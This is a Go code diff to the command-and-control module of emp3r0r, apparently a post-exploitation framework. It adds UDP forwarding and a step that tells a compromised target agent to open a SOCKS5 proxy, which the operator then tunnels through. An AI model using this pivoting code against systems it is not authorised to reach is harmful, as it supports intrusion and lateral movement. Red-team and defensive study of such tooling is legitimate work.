@@ -1,10 +1,16 @@
+//go:build linux
+// +build linux
+
 package cc
+
 
 import (
 	"context"
 	"fmt"
 
+	"github.com/google/uuid"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 func modulePortFwd() {
@@ -44,6 +50,7 @@ func modulePortFwd() {
 		var pf PortFwdSession
 		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
 		pf.Lport, pf.To = Options["listen_port"].Val, Options["to"].Val
+		pf.Protocol = Options["protocol"].Val
 		go func() {
 			err := pf.RunPortFwd()
 			if err != nil {
@@ -59,23 +66,65 @@ func moduleProxy() {
 	status := Options["status"].Val
 
 	// port-fwd
-	var pf PortFwdSession
+	var pf = new(PortFwdSession)
 	pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
-	pf.Lport, pf.To = port, "127.0.0.1:"+RuntimeConfig.ProxyPort
-	pf.Description = fmt.Sprintf("Agent Proxy:\n%s (Local) -> %s (Agent)", pf.Lport, pf.To)
+	pf.Lport, pf.To = port, "127.0.0.1:"+RuntimeConfig.AutoProxyPort
+	pf.Description = fmt.Sprintf("Agent Proxy (TCP):\n%s (Local) -> %s (Agent)", pf.Lport, pf.To)
+	pf.Protocol = "tcp"
+	pf.Timeout = RuntimeConfig.AutoProxyTimeout
+
+	// udp port fwd
+	var pfu = new(PortFwdSession)
+	pfu.Ctx, pfu.Cancel = context.WithCancel(context.Background())
+	pfu.Lport, pfu.To = port, "127.0.0.1:"+RuntimeConfig.AutoProxyPort
+	pfu.Description = fmt.Sprintf("Agent Proxy (UDP):\n%s (Local) -> %s (Agent)", pfu.Lport, pfu.To)
+	pfu.Protocol = "udp"
+	pfu.Timeout = RuntimeConfig.AutoProxyTimeout
 
 	switch status {
 	case "on":
-		// port mapping of default socks5 proxy
-		go func() {
-			err := pf.RunPortFwd()
-			if err != nil {
-				CliPrintError("PortFwd failed: %v", err)
+		// tell agent to start local socks5 proxy
+		cmd_id := uuid.NewString()
+		err = SendCmdToCurrentTarget("!proxy on 0.0.0.0:"+RuntimeConfig.AutoProxyPort, cmd_id)
+		if err != nil {
+			CliPrintError("Starting SOCKS5 proxy on target failed: %v", err)
+			return
+		}
+		var ok bool
+		for i := 0; i < 120; i++ {
+			_, ok = CmdResults[cmd_id]
+			if ok {
+				break
 			}
-		}()
+			util.TakeABlink()
+		}
+
+		if !ok {
+			CliPrintError("Timeout waiting for agent to start SOCKS5 proxy")
+			return
+		} else {
+			// TCP forwarding
+			go func() {
+				err := pf.RunPortFwd()
+				if err != nil {
+					CliPrintError("PortFwd (TCP) failed: %v", err)
+				}
+			}()
+			// UDP forwarding
+			go func() {
+				for pf.Sh == nil {
+					util.TakeABlink()
+				}
+				err := pfu.RunPortFwd()
+				if err != nil {
+					CliPrintError("PortFwd (UDP) failed: %v", err)
+				}
+			}()
+		}
 	case "off":
 		for id, session := range PortFwds {
-			if session.Description == pf.Description {
+			if session.Description == pf.Description ||
+				session.Description == pfu.Description {
 				session.Cancel() // cancel the PortFwd session
 
 				// tell the agent to close connection
